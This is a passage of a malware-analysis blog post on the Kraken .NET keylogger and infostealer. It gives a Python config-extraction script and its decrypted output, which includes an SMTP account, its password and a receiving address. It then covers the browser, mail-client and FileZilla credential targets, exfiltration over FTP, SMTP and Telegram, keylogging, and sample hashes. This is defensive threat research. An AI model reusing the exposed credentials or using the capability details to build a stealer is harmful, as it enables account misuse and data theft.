<p><img src="/assets/images/Kraken-Keylogger-pt1/7.png" alt="image-4.png" /></p>

<p>The second strange DLL will have 2 embedded resources that will be decrypted, the first embedded resource <code class="language-plaintext highlighter-rouge">SeaCyanPul</code> will be a <code class="language-plaintext highlighter-rouge">.DLL</code> that will be in charge of injecting the final payload to <code class="language-plaintext highlighter-rouge">RegAsm.exe</code> (won’t be getting into it right now but the 3rd stage will be uploaded to Malware Bazaar)<br />
The second resource <code class="language-plaintext highlighter-rouge">UnknownDetails</code> will be our final payload which will be decrypted using a simple <code class="language-plaintext highlighter-rouge">AES-ECB</code> encryption routine without IV, the key in this case will be a sha256 of null value:</p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/8.png" alt="image-5.png" /></p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/9.png" alt="image-6.png" /></p>

<p>As I wrote before that, the payload will injected to <code class="language-plaintext highlighter-rouge">RegAsm.exe</code></p>

<h1 id="kraken-payload">Kraken Payload</h1>
<p>The Kraken payload <code class="language-plaintext highlighter-rouge">32-bit .NET</code> binary, so we can work with <code class="language-plaintext highlighter-rouge">DnSpy</code> to go over some of it functionalities.</p>

<h2 id="kraken-configs">Kraken Configs</h2>
<p>The configs of the Kraken stored in the <code class="language-plaintext highlighter-rouge">.cctor</code> of the main class:</p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/10.png" alt="image.png" /></p>

<p>Some of the configs are encrypted using <code class="language-plaintext highlighter-rouge">DES-EBC</code> encryption routine without IV, the key is <code class="language-plaintext highlighter-rouge">MD5</code> hash of a preconfigured string, in this case: <code class="language-plaintext highlighter-rouge">swCpiTiAhkkEpyDZTnAGhOBZpr</code>, here is a quick python script that will decrypt the config strings for us:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">malduck</span><span class="p">,</span> <span class="n">base64</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">DES</span>
<span class="n">encryptedStringsDict</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'PersonalEmail'</span><span class="p">:</span> <span class="s">'KYlYJirrzmj9NFMzqVxdqqmBPWvogKC9'</span><span class="p">,</span>
    <span class="s">'PersonalEmailPassword'</span><span class="p">:</span> <span class="s">'lNI13bp6TxER2sT4YYxfjw=='</span><span class="p">,</span>
    <span class="s">'PersonalEmailHost'</span><span class="p">:</span> <span class="s">'6pvSg6TWhxedDZq2k3/l06fwica30Jlg'</span><span class="p">,</span>
    <span class="s">'TheSMTPReciver'</span><span class="p">:</span> <span class="s">'qUQWGy6wVRm4PKDty97tnE+Z3alydqyP'</span><span class="p">,</span>
    <span class="s">'PersonalEmailPort'</span><span class="p">:</span> <span class="s">'VqONpyzLqFY='</span><span class="p">,</span>
    <span class="s">'PersonalHostLink'</span><span class="p">:</span> <span class="s">'EdrE+GGMX48='</span><span class="p">,</span>
    <span class="s">'PersonalHostPassword'</span><span class="p">:</span> <span class="s">'EdrE+GGMX48='</span><span class="p">,</span>
    <span class="s">'PersonalHostUsername'</span><span class="p">:</span> <span class="s">'EdrE+GGMX48='</span><span class="p">,</span>
    <span class="s">'TheTelegramToken'</span><span class="p">:</span> <span class="s">'EdrE+GGMX48='</span><span class="p">,</span>
    <span class="s">'PersonalTeleID'</span><span class="p">:</span> <span class="s">'EdrE+GGMX48='</span>
<span class="p">}</span>

<span class="n">md5hashKey</span> <span class="o">=</span> <span class="n">malduck</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="sa">b</span><span class="s">'swCpiTiAhkkEpyDZTnAGhOBZpr'</span><span class="p">)[:</span><span class="mi">8</span><span class="p">]</span>
<span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">encryptedStringsDict</span><span class="p">.</span><span class="n">items</span><span class="p">():</span>
    <span class="n">des</span> <span class="o">=</span> <span class="n">DES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">md5hashKey</span><span class="p">,</span> <span class="n">DES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
    <span class="n">decVal</span> <span class="o">=</span> <span class="n">des</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">v</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[+] </span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s"> - </span><span class="si">{</span><span class="n">decVal</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] PersonalEmail - onuma.b@thereccorp.com
[+] PersonalEmailPassword - O@1234
[+] PersonalEmailHost - mail.thereccorp.com
[+] TheSMTPReciver - jbs.hannong@gmail.com
[+] PersonalEmailPort - 587
[+] PersonalHostLink 
[+] PersonalHostPassword 
[+] PersonalHostUsername 
[+] TheTelegramToken 
[+] PersonalTeleID 
</code></pre></div></div>

<p>So now we have the configuration of the Kraken, let’s move to some capabilities overview:</p>
<h2 id="custom-commands">Custom Commands</h2>
<p>The Kraken has several functions that can be executed (only if the user of the malware flag them during the compilation process of the stub), such as:</p>
<ul>
  <li>TimeToRun</li>
  <li>LoadWeb</li>
  <li>Disable_Task</li>
  <li>Disable_CommandPrompt</li>
  <li>Disable_Regis</li>
  <li>ProcessKiller</li>
</ul>

<p><img src="/assets/images/Kraken-Keylogger-pt1/11.png" alt="image.png" /></p>

<p>Nothing really interesting here, probably some persistence methods/VM checks.</p>

<h2 id="harvesting-capabilities">Harvesting Capabilities</h2>
<p>The kraken follows the usual info stealer path as stealing local Outlook, Foxmail, ThunderBird mails credentials. <br /></p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/12.png" alt="image-2.png" /></p>

<p>It will lookup for credentials in those browsers:</p>
<ul>
  <li>Google Chrome</li>
  <li>QQ Browser</li>
  <li>Vivaldi Browser</li>
  <li>Chromium Browser</li>
  <li>Cent Browser</li>
  <li>Chedot Browser</li>
  <li>360Browser</li>
  <li>Brave</li>
  <li>Torch</li>
  <li>UC Browser</li>
  <li>Blisk</li>
  <li>Opera</li>
  <li>Avast Browser</li>
  <li>Edge</li>
  <li>Google Chrome Canary</li>
  <li>Firefox</li>
  <li>CocCoc</li>
  <li>Citrio Browser</li>
  <li>CoolNovo</li>
  <li>Epic Privacy Browser</li>
</ul>

<p>The Kraken will also look for FileZilla Credentials</p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/13.png" alt="image-3.png" /></p>

<h2 id="exfiltration">Exfiltration</h2>
<p>The Kraken allows exfiltration via:</p>
<ul>
  <li>FTP</li>
  <li>SMTP</li>
  <li>Telegram Bot</li>
</ul>

<h3 id="ftp">FTP</h3>

<p><img src="/assets/images/Kraken-Keylogger-pt1/14.png" alt="image-4.png" /></p>

<h3 id="smtp">SMTP</h3>

<p><img src="/assets/images/Kraken-Keylogger-pt1/15.png" alt="image-5.png" /></p>

<h3 id="telegram-bot">Telegram Bot</h3>

<p><img src="/assets/images/Kraken-Keylogger-pt1/16.png" alt="image-6.png" /></p>

<h2 id="post-exfiltration-actions">Post Exfiltration Actions</h2>

<p>After the stealing process was done, the Kraken will automatically start a keylogging process + screenshot capturing of the victim’s computer:</p>

<p><img src="/assets/images/Kraken-Keylogger-pt1/17.png" alt="image-7.png" /></p>

<h1 id="iocs">IOC’s</h1>
<ul>
  <li>Doc signed Subcontract Agreement.zip - <a href="https://bazaar.abuse.ch/sample/79571f0ad832a31a1121f7c698496de7e4700271ccf0a7ed7fe817688528a953/">79571f0ad832a31a1121f7c698496de7e4700271ccf0a7ed7fe817688528a953</a></li>
  <li>seedof.lnk - <a href="https://bazaar.abuse.ch/sample/beec3ec08fba224c161464ebcc64727912c6678dd452596440809ce99c8390fd/">beec3ec08fba224c161464ebcc64727912c6678dd452596440809ce99c8390fd</a></li>
  <li>1st.exe - <a href="https://bazaar.abuse.ch/sample/dddaf7dfb95c12acaae7de2673becf94fb9cfa7c2d83413db1ab52a5d9108b79">dddaf7dfb95c12acaae7de2673becf94fb9cfa7c2d83413db1ab52a5d9108b79</a></li>
  <li>2nd.dll - <a href="https://bazaar.abuse.ch/sample/f7c66ce4c357c3a7c44dda121f8bb6a62bb3e0bc6f481619b7b5ad83855d628b/">f7c66ce4c357c3a7c44dda121f8bb6a62bb3e0bc6f481619b7b5ad83855d628b</a></li>
  <li>3rd.dll - <a href="https://bazaar.abuse.ch/sample/43e79df88e86f344180041d4a4c9381cc69a8ddb46315afd5c4c3ad9e6268e17/">43e79df88e86f344180041d4a4c9381cc69a8ddb46315afd5c4c3ad9e6268e17</a></li>
  <li>Kraken.exe - <a href="https://bazaar.abuse.ch/sample/ee76fec4bc7ec334cc6323ad156ea961e27b75eaa7efb4e88212b81e65673000/">ee76fec4bc7ec334cc6323ad156ea961e27b75eaa7efb4e88212b81e65673000</a></li>
</ul>

<h1 id="summary">Summary</h1>
<p>In this blog I’ve covered a new .NET based stealer/keylogger malware, the way it was used in a phishing campaign, and a dive into the loader/injection process including overview of the malware capabilities and config extraction.</p>

<h1 id="part-2">Part 2</h1>
<p>In part 2 I will be explaining my Threat hunting process, why the malware being flagged falsely? and how I managed to find more samples that helped me confirm my findings.
<br /><br />
Part 2 is up! check it out <a href="https://0xtoxin.github.io/threat%20hunting/KrakenKeylogger-pt2/">right here</a></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#net" class="page__taxonomy-item" rel="tag">.NET</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#config-extraction" class="page__taxonomy-item" rel="tag">Config Extraction</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#krakenkeylogger" class="page__taxonomy-item" rel="tag">KrakenKeylogger</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">PowerShell</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware Analysis</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-05-20T00:00:00+00:00">May 20, 2023</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=Kraken+-+The+Deep+Sea+Lurker+Part+1%20https%3A%2F%2F0xtoxin.github.io%2Fmalware%2520analysis%2FKrakenKeylogger-pt1%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2F0xtoxin.github.io%2Fmalware%2520analysis%2FKrakenKeylogger-pt1%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2F0xtoxin.github.io%2Fmalware%2520analysis%2FKrakenKeylogger-pt1%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/threat%20breakdown/PlutoCrypt-DeepDive/" class="pagination--pager" title="PlutoCrypt - A CryptoJoker Ransomware Variant
">Previous</a>
    
    
      <a href="/threat%20hunting/KrakenKeylogger-pt2/" class="pagination--pager" title="Kraken - The Deep Sea Lurker Part 2
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 0xToxin. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
